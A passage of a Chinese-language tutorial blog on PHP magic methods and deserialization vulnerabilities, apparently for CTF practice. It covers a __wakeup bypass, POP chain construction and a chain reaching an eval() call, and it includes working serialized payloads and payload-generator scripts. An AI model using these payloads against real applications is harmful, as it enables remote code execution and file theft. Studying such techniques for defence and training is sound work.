class="string">"\n"</span>;</span></span><br><span class="line"><span class="php"><span class="comment">//存在__sleep()函数，$info属性不会被存储</span></span></span><br><span class="line"><span class="php">$temp = serialize($me);</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $temp . <span class="string">"\n"</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$me = unserialize($temp);  <span class="comment">// info属性也会被反序列化</span></span></span><br><span class="line"><span class="php"><span class="comment">//__wakeup()组装的$info</span></span></span><br><span class="line"><span class="php">var_dump($me);</span></span><br><span class="line"><span class="php"><span class="comment">//$me-&gt;getInfo();</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
<p><strong>__toString()</strong></p>
<p>__toString() 方法用于一个类被当成字符串时应怎样回应。例如 echo $obj; 应该显示些什么。此方法必须返回一个字符串，否则将发出一条 E_RECOVERABLE_ERROR 级别的致命错误。</p>
<p>就是当使用  echo 对象名    因为echo只能用来输出字符串 当用在输出对象时,就会在类里面寻找__toString()  输出这个方法的返回值<br><strong>实例</strong></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> </span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">xiaoyang</span></span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $xiaoyang;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($xiaoyang)</span></span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;xiaoyang = $xiaoyang;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">"-----------------"</span>.<span class="string">"\n"</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;xiaoyang;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$class = <span class="keyword">new</span> xiaoyang(<span class="string">'hello xiaoyang'</span>);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $class;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"> <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
<h2 id="输出"><a href="#输出" class="headerlink" title="   输出:"></a>   输出:</h2><pre><code>hello xiaoyang[Finished in 0.1s]
</code></pre><h2 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h2><h3 id="绕过-wakeup"><a href="#绕过-wakeup" class="headerlink" title="绕过__wakeup()"></a>绕过__wakeup()</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> </span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">SoFun</span></span>&#123; </span></span><br><span class="line"><span class="php">  <span class="keyword">protected</span> $file=<span class="string">'index.php'</span>;</span></span><br><span class="line"><span class="php">  <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123; </span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;file)) &#123;</span></span><br><span class="line"><span class="php">      <span class="keyword">if</span>(strchr(<span class="keyword">$this</span>-&gt; file,<span class="string">"\\"</span>)===<span class="keyword">false</span> &amp;&amp;  strchr(<span class="keyword">$this</span>-&gt;file, <span class="string">'/'</span>)===<span class="keyword">false</span>)  </span></span><br><span class="line"><span class="php">      <span class="comment">//strchr()返回/及其剩余的部分  strstr()的别名</span></span></span><br><span class="line"><span class="php">        show_source(dirname (<span class="keyword">__FILE__</span>).<span class="string">'/'</span>.<span class="keyword">$this</span> -&gt;file);</span></span><br><span class="line"><span class="php">      <span class="comment">// show_source()   别名 highlight_file()   测试文件 进行 PHP 语法高亮显示：</span></span></span><br><span class="line"><span class="php">      <span class="keyword">else</span></span></span><br><span class="line"><span class="php">        <span class="keyword">die</span>(<span class="string">'Wrong filename.'</span>);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">  &#125;  </span></span><br><span class="line"><span class="php">  <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">   <span class="keyword">$this</span>-&gt; file=<span class="string">'index.php'</span>;</span></span><br><span class="line"><span class="php">  &#125; </span></span><br><span class="line"><span class="php">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">    <span class="keyword">return</span> <span class="string">''</span> ;</span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">&#125;     </span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>]))&#123; </span></span><br><span class="line"><span class="php">  show_source(<span class="string">'index.php'</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">else</span>&#123; </span></span><br><span class="line"><span class="php">  $file=base64_decode($_GET[<span class="string">'file'</span>]); </span></span><br><span class="line"><span class="php">  <span class="keyword">echo</span> unserialize($file); </span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"> <span class="meta">?&gt;</span></span> #<span class="comment">&lt;!--key in flag.php--&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>destruct()方法会读取文件<br>思路大概就是构造序列化对象然后base64编码传入，经过unserialize将file设为flag.php，但是</strong>wakeup会在unserialize之前执行，所以要绕过这一点。</p>
<p>当序列化属性要大于真实属性的个数时, 会跳过__wakeup()</p>
<p>先构造序列化<br>构造序列化对象：O:5:”SoFun”:1:{S:7:”\00*\00file”;s:8:”flag.php”;}</p>
<p>再修改属性值<br>构造序列化对象：O:5:”SoFun”:2:{S:7:”\00*\00file”;s:8:”flag.php”;}</p>
<p><strong>注:</strong><br>因为file是protect属性，所以需要加上\00*\00。再base64编码。</p>
<h3 id="session反序列化漏洞"><a href="#session反序列化漏洞" class="headerlink" title="session反序列化漏洞"></a>session反序列化漏洞</h3><h2 id="POP链构造"><a href="#POP链构造" class="headerlink" title="POP链构造"></a>POP链构造</h2><p><strong>类的构成</strong><br>类成员包括由属性和方法构成，类属性存在于数据段，类方法存在于代码段，对于一个类来说，类的方法不占用类的空间，占空间的只有类的属性</p>
<p><strong>概念</strong><br>在二进制利用时，ROP 链构造中是寻找当前系统环境中或者内存环境里已经存在的、具有固定地址且带有返回操作的指令集，而 POP 链的构造则是寻找程序当前环境中已经定义了或者能够动态加载的对象中的属性（函数方法），将一些可能的调用组合在一起形成一个完整的、具有目的性的操作。<br>二进制中通常是由于内存溢出控制了指令执行流程，而反序列化过程就是控制代码执行流程的方法之一，前提：进行反序列化的数据能够被用户输入所控制。</p>
<p><strong>POP链利用</strong><br>一般的序列化攻击都在PHP魔术方法中出现可利用的漏洞，因为自动调用触发漏洞，但如果关键代码没在魔术方法中，而是在一个类的普通方法中。这时候就可以通过构造POP链寻找相同的函数名将类的属性和敏感函数的属性联系起来<br><strong>挖掘思路</strong><br>能控制反序列化的点<br>反序列化类有魔术方法<br>魔术方法里有敏感操作（常规思路）<br>魔术方法里无敏感操作，但是通过属性（对象）调用了一些函数，恰巧在其他的类中有同名的函数（pop链）</p>
<p><strong>例子</strong></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">start_gg</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> $mod1;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> $mod2;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">$this</span>-&gt;mod1-&gt;test1();</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Call</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> $mod1;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> $mod2;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test1</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;mod1-&gt;test2();</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">funct</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> $mod1;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> $mod2;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($test2,$arr)</span></span></span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">                $s1 = <span class="keyword">$this</span>-&gt;mod1;</span></span><br><span class="line"><span class="php">                $s1();</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">func</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> $mod1;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> $mod2;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">$this</span>-&gt;mod2 = <span class="string">"字符串拼接"</span>.<span class="keyword">$this</span>-&gt;mod1;</span></span><br><span class="line"><span class="php">        &#125; </span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">string1</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> $str1;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> $str2;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">$this</span>-&gt;str1-&gt;get_flag();</span></span><br><span class="line"><span class="php">                <span class="keyword">return</span> <span class="string">"1"</span>;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">GetFlag</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">echo</span> <span class="string">"flag:"</span>.<span class="string">"xxxxxxxxxxxx"</span>;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">$a = $_GET[<span class="string">'string'</span>];</span></span><br><span class="line"><span class="php">unserialize($a);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
<p>首先看到 flag的输出在 GetFlag 类的普通方法get_flag里面<br>要想让这个方法执行 就要构造POP链</p>
<p>步骤:</p>
<ol>
<li><p>在 string1类 中发现同名方法 get_flag() 在string类的<strong>tostring中 要想让</strong>tostring执行就想要把类string 当做字符串 因为调用的是参数str1 的方法 所以要将str1 赋值为 类getFlag 的对象<br>public function __construct(){</p>
<pre><code>  $this-&gt;str1 = new GetFlag();    //将$str1赋值为  类Getflag 的对象
}
</code></pre></li>
<li><p>在 fnc类 发现<strong>invoke方法 当把对象当做函数时会调用此方法 $this-&gt;mod2 = “字符串拼接”.$this-&gt;mod1;<br>将$mod1赋值为 string1类 的对象<br>public function </strong>construct(){</p>
<pre><code>  $this-&gt;mod1 = new string1();
}
</code></pre></li>
<li><p>funct类 中的<strong>call 方法 中 调用类mod1方法 且参数为$test2,即无法调用test2方法时自动调用 </strong>call方法<br>需要将mod1 赋值为 func类 的对象<br>public function __construct(){</p>
<pre><code>  $this-&gt;mod1 = new func();
}
</code></pre></li>
<li><p>在Call中的test1方法中存在$this-&gt;mod1-&gt;test2();，需要把$mod1赋值为funct的对象，让<strong>call自动调用。<br>public function </strong>construct(){</p>
<pre><code>  $this-&gt;mod1 = new funct();
}
</code></pre></li>
</ol>
<p>5.查找test1方法的调用点，在start_gg中发现$this-&gt;mod1-&gt;test1();，把$mod1赋值为start_gg类的对象，等待<strong>destruct()自动调用。<br>public function </strong>construct(){<br>          $this-&gt;mod1 = new Call();<br>        }</p>
<p>最终payload:</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">start_gg</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> $mod1;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> $mod2;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">          <span class="keyword">$this</span>-&gt;mod1 = <span class="keyword">new</span> Call();</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">$this</span>-&gt;mod1-&gt;test1();</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Call</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> $mod1;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> $mod2;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">          <span class="keyword">$this</span>-&gt;mod1 = <span class="keyword">new</span> funct();</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test1</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;mod1-&gt;test2();</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">funct</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> $mod1;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> $mod2;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">          <span class="keyword">$this</span>-&gt;mod1 = <span class="keyword">new</span> func();</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($test2,$arr)</span>  // 当调用的成员方法不存在时调用此方法</span></span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">                $s1 = <span class="keyword">$this</span>-&gt;mod1;</span></span><br><span class="line"><span class="php">                $s1();</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">func</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> $mod1;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> $mod2;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">          <span class="keyword">$this</span>-&gt;mod1 = <span class="keyword">new</span> string1();</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span>   //把一个对象当做函数去执行会调用此方法</span></span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">$this</span>-&gt;mod2 = <span class="string">"字符串拼接"</span>.<span class="keyword">$this</span>-&gt;mod1;</span></span><br><span class="line"><span class="php">        &#125; </span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">string1</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> $str1;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> $str2;</span></span><br><span class="line"><span class="php">        </span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">          <span class="keyword">$this</span>-&gt;str1 = <span class="keyword">new</span> GetFlag();    <span class="comment">//将$str1赋值为  类Getflag 的对象</span></span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        </span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">$this</span>-&gt;str1-&gt;get_flag();</span></span><br><span class="line"><span class="php">                <span class="keyword">return</span> <span class="string">"1"</span>;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">GetFlag</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">echo</span> <span class="string">"flag:"</span>.<span class="string">"xxxxxxxxxxxx"</span>;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">$a = <span class="keyword">new</span> start_gg;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> serialize($a);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
<p><strong>例子2</strong></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">lemon</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">protected</span> $ClassObj;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;ClassObj = <span class="keyword">new</span> normal();</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;ClassObj-&gt;action();</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">normal</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">action</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">"hello"</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">evil</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">private</span> $data;</span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">action</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;data);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure>
<p>在 lemo类中调用得的是 normal类 但是在 evil类 中也有在normal类中的相同方法名 action<br>这时可以构造poc链来调用 evil类 中的 action方法<br>payload：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">lemon</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">protected</span> $ClassObj;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;ClassObj = <span class="keyword">new</span> evil();</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">   </span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">normal</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">action</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">"hello"</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">evil</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">private</span> $data = <span class="string">"phpinfo()"</span>;</span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">action</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;data);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">$a = <span class="keyword">new</span> lemon;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> serialize($a);</span></span><br></pre></td></tr></table></figure>
<h2 id="一些绕过"><a href="#一些绕过" class="headerlink" title="一些绕过"></a>一些绕过</h2><p>1、当成员属性数目大于实际数目时可绕过wakeup方法</p>
<p>2、CTF中成员属性数目前面多一个+可以绕过正则</p>
